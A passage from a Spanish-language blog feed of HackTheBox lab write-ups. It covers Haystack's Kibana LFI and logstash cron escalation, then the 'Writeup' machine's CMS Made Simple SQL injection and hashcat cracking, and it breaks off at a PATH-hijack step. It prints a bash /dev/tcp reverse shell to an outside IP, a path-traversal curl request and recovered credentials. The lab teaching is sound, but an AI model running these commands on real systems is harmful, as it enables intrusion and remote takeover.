        &lt;span class=&#34;nx&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;sr&#34;&gt;/a/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Prevents the Node.js application form crashing
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;})();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Escribimos nuestra shell en &lt;code&gt;/tmp/&lt;/code&gt; y le dimos permisos para todos los usuarios:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_183422.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para poder ejecutar nuestra shell inversa podemos hacer una solicitud con curl o hacerlo con firefox:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;amp;apis=../../../../../../.../../../../tmp/shell.js&amp;#34;&lt;/span&gt; -vv
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Por otro lado obtuvimos nuestra shell inversa como usuario Kibana:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_183604.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Para obtener una shell como usuario root primero enumeramos los crons que se ejecutan con el usuario root esto lo hacemos con pspy. Al realizar esto encontramos un proceso que se ejecuta cada minuto aproximadamente. Este proceso esta relacionado con logstash la cual es una herramienta que administra los logs.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190630_003942.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al realizar una enumearcion de esta herramienta encontramos dentro de &lt;code&gt;/etc/logstash&lt;/code&gt; los archivos de configuracion de esta herramienta. Dentro de la carpeta &lt;code&gt;/etc/logstash/conf.d&lt;/code&gt; encontramos 3 archivos los cuales se utilizan para administrar logs.&lt;/p&gt;
&lt;p&gt;El primer archivo (filter.conf) contiene una expresion regular la cual es utlizada para organizar los archivos log. En el segundo archivo (input.conf) encontramos que apunta a un archivo &lt;code&gt;path =&amp;gt; /opt/kibana/logstash_*&lt;/code&gt; el cual va ser ejecutado por el programa con cierto intervalo de tiempo. En el tercer archivo (output.conf) este ultimo ejecuta el archivo o el codigo que se encuentra en el archivo (path) &lt;code&gt;input.conf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;filter.conf&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;filter {
   if [type] == &amp;#34;execute&amp;#34; {
      grok {
         match =&amp;gt; { &amp;#34;message&amp;#34; =&amp;gt; &amp;#34;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&amp;#34; }
      }
   }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;input.conf&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;input {
   file {
      path =&amp;gt; &amp;#34;/opt/kibana/logstash_*&amp;#34;
      start_position =&amp;gt; &amp;#34;beginning&amp;#34;
      sincedb_path =&amp;gt; &amp;#34;/dev/null&amp;#34;
      stat_interval =&amp;gt; &amp;#34;10 second&amp;#34;
      type =&amp;gt; &amp;#34;execute&amp;#34;
      mode =&amp;gt; &amp;#34;read&amp;#34;
   }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;output.conf&lt;/strong&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;output {
   if [type] == &amp;quot;execute&amp;quot; {
      stdout { codec =&amp;gt; json }
      exec {
         command =&amp;gt; &amp;quot;%{comando} &amp;amp;&amp;quot;
      }
   }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://stackoverflow.com/questions/44591928/logstash-configuration-to-execute-a-command-to-elastic-search&#34;&gt;&lt;strong&gt;Execute Cmd on Elasticsearch&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ya que este programa es ejecutado por el usuario root cada cierto tiempo, podemos escribir como usuario Kibana en el directorio /opt/kibana/ un archivo de shell inversa, pero este archivo debe de hacer match con la expresion regular que se encuentra en el archivo &lt;strong&gt;filter.conf&lt;/strong&gt;: &lt;code&gt;(&#39;match =&amp;gt; { &amp;quot;message&amp;quot; =&amp;gt; &amp;quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&amp;quot; }&#39;)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Para poder entender un poco mas las expresiones regulares de esta herramienta podemos verlo aqui:&lt;/p&gt;
&lt;p&gt;[&lt;strong&gt;Grok Patterns&lt;/strong&gt;](&lt;a href=&#34;https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html#_custom_patterns&#34;&gt;https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html#_custom_patterns&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://streamsets.com/documentation/datacollector/latest/help/datacollector/UserGuide/Apx-GrokPatterns/GrokPatterns_title.html&#34;&gt;https://streamsets.com/documentation/datacollector/latest/help/datacollector/UserGuide/Apx-GrokPatterns/GrokPatterns_title.html&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;El codigo que debemos de agregar al archivo es:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Ejecutar comando : /usr/bin/bash -i &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.14.85/1598 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para agregar el codigo a nuestro archivo utilizamos el siguiente comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Ejecutar comando : /usr/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.85/1598 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt; &amp;gt; /opt/kibana/logstash_bash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El nombre de nuestro archivo debe de llevar en su nombre &lt;code&gt;logstash_&lt;/code&gt; (input.conf) para que pueda ser ejecutado en nuestro caso &lt;code&gt;/opt/kibana/logstash_bash&lt;/code&gt;. Un problema que tiene esta herramienta es la ejecucion, especificamente por el nombre ya que por alguna razon utilizar el mismo nombre de archivo genera algun problema y no se ejecuta, por lo que al agregar o cambiar el comando que se desea ejecutar se debe de crear un nuevo archivo con diferente nombre.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190630_005706.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Por otro lado ponemos a la escucha netcat con el puerto que le pasamos a nuestra shell inversa, esperamos un poco a que se ejecute el cron de nuevo y obtenemos una shell como usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Codigo de nuestra shelll inversa se ejecuta:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190630_010005.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;shell-usuario-root&#34;&gt;Shell, usuario root:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_232129.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/haystack/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/haystack/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
            
              <category>elasticsearch</category>
            
          
            
              <category>kibana 6.4.2</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Writeup</title>
        <link>https://sckull.github.io/posts/writeup/</link>
        <pubDate>Sat, 12 Oct 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 12 Oct 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/writeup/</guid>
        <description>Writeup es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Writeup es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Writeup&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.138&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/77141&#34;&gt;jkr&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP##&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos TCP/UDP.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/writeup# masscan -p1-65535,U:1-65535 10.10.10.138 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-06-14 23:30:31 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 80/tcp on 10.10.10.138                                    
Discovered open port 22/tcp on 10.10.10.138

Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-06-14 17:38 CST
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.138
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.25 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; disallowed entry 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/writeup/
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.25 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Nothing here yet.
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 17.79 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---puerto-80&#34;&gt;HTTP - Puerto 80&lt;/h2&gt;
&lt;p&gt;Al visitar el puerto 80 en http nos muestra una pagina con un mensaje en el cual nos indica que la pagina tiene un script anti ddos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_131024.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;robotstxt&#34;&gt;Robots.txt&lt;/h4&gt;
&lt;p&gt;Intentamos utilizar gobuster, dirb y wfuzz para busqueda de directorios y archivos pero por el script que nos indica en la pagina principal no pudimos realizar dicha busqueda por lo que visitamos el archivo robots.txt de la pagina principal y nos muestra que esta &amp;ldquo;oculto&amp;rdquo; &lt;code&gt;/writeup/&lt;/code&gt;, al visitar esta pagina nos muestra una serie de writeups de maquinas que ya fueron retiradas de hackthebox.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_131244.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;cms-made-simple&#34;&gt;CMS Made Simple&lt;/h3&gt;
&lt;p&gt;Utilizamos la extension para firefox &lt;code&gt;Wappalyzer&lt;/code&gt; la cual nos ayuda a identificar el tipo de CMS, Web Server, Programming Language y Operating Ssytem de una pagina web. Al utilizar esta extension en la pagina nos muestra lo mencionado anteriormente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_170512.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Sabiendo esto buscamos exploits que puedan afectar a este CMS con Searchsploit.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_170708.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos varios exploits que afectan a este CMS cada uno de ellos en distintas versiones y tipos de vulnerabilidad, para esta version utilizamos &lt;code&gt;CMS Made Simple &amp;lt; 2.2.10 - SQL Injection&lt;/code&gt; (CVE-2019-9053).&lt;/p&gt;
&lt;h2 id=&#34;cms-made-simple---sqli&#34;&gt;CMS Made Simple - SQLI&lt;/h2&gt;
&lt;p&gt;Utilizamos el exploit contra la pagina y nos muestra las credenciales del usuario jkr el salto de la contraseña y la contraseña.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_171931.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/writeup# python CVE-2019-9053.py -u http://10.10.10.138/writeup/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Salt &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; password found: 5a599ef579066807
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Username found: jkr
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Email found: jkr@writeup.htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Password found: 62def4866937f08cc13bab43bb14e6f7
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;hashcat&#34;&gt;Hashcat&lt;/h2&gt;
&lt;p&gt;Para obtener la contraseña en texto plano utilizamos Hashcat, escribimos el hash y el salto de la contraseña en un archivo para utilizarlo con hashcat y un diccionario.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Contraseña:salto&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Comando hashcat:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./hashcat64.bin  -m &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 ../rockyou.txt -o huehue.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Contraseña crackeada:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;ssh---user&#34;&gt;SSH - User&lt;/h2&gt;
&lt;p&gt;Cuando obtuvimos nuestra usuario y contraseña con el exploit la probamos en el panel de administracion del CMS que esta corriendo en el puerto 80 pero no tuvimos suerte de acceder por ese lado, por lo que utilizamos las credenciales en el servicio SSH y nos logeamos satisfactoriamente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_233858.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag user.txt:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190614_234021.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Utilizamos pspy para observar los procesos que se ejecutan, encontramos que un proceso se ejecuta a cada vez que se inicia sesion en el servicio de SSH.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/writeup/Screenshot_20190705_210432.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que este proceso env donde se le pasa la variable &lt;code&gt;$PATH&lt;/code&gt; del usuario root, luego de eso ejecuta un comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
